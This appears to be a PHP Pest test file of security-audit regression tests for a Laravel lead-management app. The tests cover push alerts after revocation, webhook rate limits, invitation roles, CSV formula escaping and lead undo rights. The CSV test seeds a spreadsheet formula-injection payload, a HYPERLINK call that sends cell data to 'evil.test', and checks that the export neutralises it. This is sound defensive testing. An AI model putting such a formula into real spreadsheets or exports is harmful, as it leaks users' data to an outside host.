<?php

declare(strict_types=1);

use App\Modules\Auth\Actions\DecideDevice;
use App\Modules\Auth\Models\SignInDevice;
use App\Modules\Auth\Models\User;
use App\Modules\Brands\Actions\InviteMember;
use App\Modules\Brands\Models\Membership;
use App\Modules\Core\Contracts\PushTransport;
use App\Modules\Core\Enums\BrandRole;
use App\Modules\Core\Enums\GlobalRole;
use App\Modules\Core\Enums\MembershipStatus;
use App\Modules\Core\Enums\PushResult;
use App\Modules\Core\Jobs\SendWebPush;
use App\Modules\Core\Models\PushSubscription;
use App\Modules\Core\Notifications\AppNotification;
use App\Modules\Core\Support\SpreadsheetText;
use App\Modules\Leads\Actions\AssignLead;
use App\Modules\Leads\Exports\LeadsExport;
use App\Modules\Leads\Livewire\App\LeadPanel;
use App\Modules\Leads\Models\Lead;
use App\Modules\Meta\Models\MetaSource;
use App\Modules\Sites\Models\Site;
use App\Modules\Sites\Support\IngestSignature;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Queue;
use Livewire\Livewire;
use Maatwebsite\Excel\Excel as ExcelFormat;
use Maatwebsite\Excel\Facades\Excel;

/*
 * Security audit, 28 Oct 2026, the remaining leads: desktop alerts after a
 * revocation, webhook allowances, invitations for IT and Website leads people,
 * formulas in CSV exports, and Undo of a take.
 */

/** A browser that turned on desktop alerts for this person. */
function pushRowFor(User $user, string $endpoint): PushSubscription
{
    return PushSubscription::query()->create([
        'user_id' => $user->getKey(), 'endpoint' => $endpoint, 'endpoint_hash' => hash('sha256', $endpoint),
        'public_key' => 'key', 'auth_token' => 'auth', 'content_encoding' => 'aes128gcm',
    ]);
}

it('stops desktop alerts to a blocked phone, after a new password, and for a suspended person', function (): void {
    $agent = User::factory()->create();
    pushRowFor($agent, 'https://fcm.googleapis.com/fcm/send/phone');
    $device = SignInDevice::query()->create([
        'user_id' => $agent->getKey(), 'token_hash' => hash('sha256', 'phone-cookie'), 'kind' => 'phone', 'name' => 'Android phone', 'status' => 'seen',
    ]);

    app(DecideDevice::class)->block($device, admin());
    expect(PushSubscription::query()->where('user_id', $agent->getKey())->count())->toBe(0);

    pushRowFor($agent, 'https://fcm.googleapis.com/fcm/send/laptop');
    $agent->forceFill(['password' => 'NewPassw0rd99'])->save();
    expect(PushSubscription::query()->where('user_id', $agent->getKey())->count())->toBe(0);

    // A suspended person is sent nothing, even to a browser still on the list.
    $sent = collect();
    $transport = new class($sent) implements PushTransport
    {
        public function __construct(private readonly Collection $sent) {}

        public function deliver(PushSubscription $subscription, string $payload): PushResult
        {
            $this->sent->push($subscription->endpoint);

            return PushResult::Delivered;
        }
    };

    pushRowFor($agent, 'https://fcm.googleapis.com/fcm/send/desk');
    $agent->forceFill(['status' => MembershipStatus::Suspended])->save();
    $agent->notify(new AppNotification(title: 'New message from Jane', body: 'secret words'));

    (new SendWebPush((string) $agent->notifications()->latest()->value('id')))->handle($transport);

    expect($sent)->toBeEmpty();
});

it('does not let unsigned requests use up a Facebook Page\'s or a website\'s webhook allowance', function (): void {
    Queue::fake();
    Http::fake();
    config(['liquify.meta.app_secret' => 'app-secret', 'liquify.meta.rate_limit' => 2, 'liquify.ingest.rate_limit' => 2]);
    MetaSource::query()->create(['brand_id' => brand()->getKey(), 'external_id' => '111', 'name' => 'Page', 'access_token' => 'page-token']);
    $junk = (string) json_encode(['object' => 'page', 'entry' => [['id' => '111']]]);

    foreach (range(1, 3) as $ignored) {
        $this->call('POST', '/webhooks/meta', [], [], [], ['CONTENT_TYPE' => 'application/json', 'REMOTE_ADDR' => '203.0.113.9'], $junk);
    }

    $body = (string) json_encode(['object' => 'page', 'entry' => [['id' => '111', 'time' => time(), 'changes' => [[
        'field' => 'leadgen', 'value' => ['leadgen_id' => '9001', 'page_id' => '111', 'form_id' => '5', 'created_time' => time()],
    ]]]]]);
    $signed = $this->call('POST', '/webhooks/meta', [], [], [], [
        'CONTENT_TYPE' => 'application/json', 'REMOTE_ADDR' => '31.13.0.1', 'HTTP_X_HUB_SIGNATURE_256' => 'sha256='.hash_hmac('sha256', $body, 'app-secret'),
    ], $body);

    expect($signed->status())->not->toBe(429);

    $site = Site::factory()->create(['brand_id' => brand()->getKey()])->refresh();

    foreach (range(1, 3) as $ignored) {
        $this->call('POST', '/api/v1/ingest/site/'.$site->site_key, [], [], [], ['CONTENT_TYPE' => 'application/json', 'HTTP_ACCEPT' => 'application/json', 'REMOTE_ADDR' => '203.0.113.9'], '{}');
    }

    $lead = (string) json_encode(['name' => 'Jane', 'email' => 'jane@example.com']);
    $time = (string) time();
    $genuine = $this->call('POST', '/api/v1/ingest/site/'.$site->site_key, [], [], [], [
        'CONTENT_TYPE' => 'application/json', 'HTTP_ACCEPT' => 'application/json', 'REMOTE_ADDR' => '198.51.100.7',
        'HTTP_X_LIQUIFY_TIMESTAMP' => $time, 'HTTP_X_LIQUIFY_SIGNATURE' => IngestSignature::sign($site->secret, $time, $lead),
    ], $lead);

    expect($genuine->status())->not->toBe(429);
});

it('does not let an IT or Website leads account join a brand through an invitation', function (string $role): void {
    $brand = brand();
    $team = department($brand);
    $manager = managerOf($team);
    $invitation = app(InviteMember::class)->handle($brand, 'x@example.test', BrandRole::Agent, $team, null, null, $manager);
    $person = User::factory()->create(['email' => 'x@example.test', 'role' => GlobalRole::from($role)])->refresh();

    $this->actingAs($person)->post('/invite/'.$invitation->token, ['accept' => '1']);

    expect(Membership::query()->acrossBrands()->where('user_id', $person->getKey())->exists())->toBeFalse()
        ->and($person->canAccessBrand($brand))->toBeFalse();
})->with(['it', 'website_leads']);

it('writes outsiders\' text into CSV exports as text, never as a formula', function (): void {
    $brand = brand();
    inBrand($brand);
    Lead::factory()->create(['brand_id' => $brand->getKey(), 'name' => '=HYPERLINK("https://evil.test/?"&C3,"x")', 'phone' => '+44 7700 900123', 'message' => '@SUM(1+1)']);

    $csv = Excel::raw(new LeadsExport(Lead::query()), ExcelFormat::CSV);

    expect($csv)->toContain("'=HYPERLINK(")
        ->and($csv)->toContain("'@SUM(1+1)")
        ->and($csv)->toContain('"+44 7700 900123"')
        ->and(SpreadsheetText::safe('-2+3'))->toBe("'-2+3")
        ->and(SpreadsheetText::safe('Jane'))->toBe('Jane')
        ->and(SpreadsheetText::safe(null))->toBeNull();
});

it('lets an Agent undo only a take they made, not a lead their Manager gave them', function (): void {
    $brand = brand();
    $front = department($brand);
    $manager = managerOf($front);
    $agent = agentOf($front);
    inBrand($brand);

    $given = Lead::factory()->create(['brand_id' => $brand->getKey(), 'department_id' => $front->getKey()]);
    app(AssignLead::class)->handle($given, $agent, $manager);

    Livewire::actingAs($agent)->test(LeadPanel::class, ['leadId' => $given->getKey()])
        ->call('undoLeadChange', $given->getKey(), 'take', null, null);

    expect($given->fresh()->assigned_to)->toBe($agent->getKey());

    // A lead the Agent just took can still be given back.
    $free = Lead::factory()->create(['brand_id' => $brand->getKey(), 'department_id' => $front->getKey(), 'assigned_to' => null]);

    Livewire::actingAs($agent)->test(LeadPanel::class, ['leadId' => $free->getKey()])
        ->call('takeLead', $free->getKey())
        ->call('undoLeadChange', $free->getKey(), 'take', null, null);

    expect($free->fresh()->assigned_to)->toBeNull();
});
